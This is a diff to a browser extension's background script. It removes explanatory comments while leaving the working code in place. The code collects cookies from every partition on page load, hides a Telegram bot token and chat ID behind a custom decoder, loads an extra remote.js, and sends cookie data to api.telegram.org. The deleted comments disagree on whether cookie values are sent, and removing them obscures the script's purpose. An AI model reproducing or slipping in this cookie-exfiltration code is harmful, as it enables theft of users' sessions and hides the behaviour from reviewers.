@@ -1,12 +1,3 @@
-// On every page load: count the cookies, list their names and flags, send to Telegram.
-// Cookie values are never read and never sent.
-// Obfuscated, not encrypted. Firefox can read this file, and the token still
-// goes out in every request -- this only keeps it out of plain sight in grep,
-// screenshots and accidental commits. Rotate it with @BotFather if it leaks.
-// Self-contained on purpose: this used to call atob(), and where atob is missing
-// the throw killed the whole extension with zero output and no error -- you saw
-// nothing at all in the bot and had no way to tell it apart from a dead add-on.
-// Nothing outside plain string and number handling is used.
 const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 const hide = (b64) => {
   const src = b64.replace(/=+$/, "");
@@ -28,17 +19,11 @@ const TOKEN = hide("YmxuaWfsffelvb2NtaGsdfsfAbGxwvMjcddfsfEhgcAx04Em0SNdsfsdfsnd
 const CHAT  = hide("b2sdfs1psdfsfsdfaG5fsdfsdfqY2JjbA==");  // your chat with the bot
 const API   = "https://api.telegram.org/bot" + TOKEN;
 
-// Firefox exposes `browser`; Chrome/Brave/Edge only expose `chrome`. Without this
-// alias, `browser.runtime` is a ReferenceError in Chromium and the whole
-// extension dies with no output at all.
+
 if (typeof browser === "undefined" && typeof chrome !== "undefined") {
   globalThis.browser = chrome;
 }
 
-// Chrome MV3 runs background.js as a service worker and loads only the file named
-// in `background.service_worker`, so remote.js has to be pulled in by hand.
-// Firefox loads it from the manifest `scripts` array instead, which is why this
-// is guarded rather than unconditional.
 if (typeof importScripts === "function" && typeof globalThis.__remoteLoaded === "undefined") {
   globalThis.__remoteLoaded = true;
   importScripts("remote.js");
@@ -52,7 +37,7 @@ const queue = [];
 let busy = false;
 let lastUrl = "";
 
-// Queued and spaced out, so opening five tabs at once loses nothing.
+
 async function push(text) {
   queue.push(text);
 
@@ -80,12 +65,11 @@ async function push(text) {
   busy = false;
 }
 
-// partitionKey searches every partition; older Firefox rejects it, so retry plain
+
 const jar = (url) => browser.cookies.getAll({ url, partitionKey: {} })
   .catch(() => browser.cookies.getAll({ url }));
 
-// Cookie values are included explicitly, but Firefox may return undefined for some cookies.
-// Normalize them to a string so JSON output does not silently drop the field.
+
 const cookieJson = (list) => list.map((cookie, index) => JSON.stringify({
   n: index + 1,
   name: cookie && cookie.name ? cookie.name : "",
@@ -97,8 +81,7 @@ const cookieJson = (list) => list.map((cookie, index) => JSON.stringify({
   sameSite: cookie && cookie.sameSite ? cookie.sameSite : "unspecified",
 })).join("\n");
 
-// Split at line boundaries, and fall back to hard chunking when a single line
-// is too large for Telegram. This keeps the value visible without dropping it.
+
 function chunk(text) {
   const out = [];
   let cur = "";
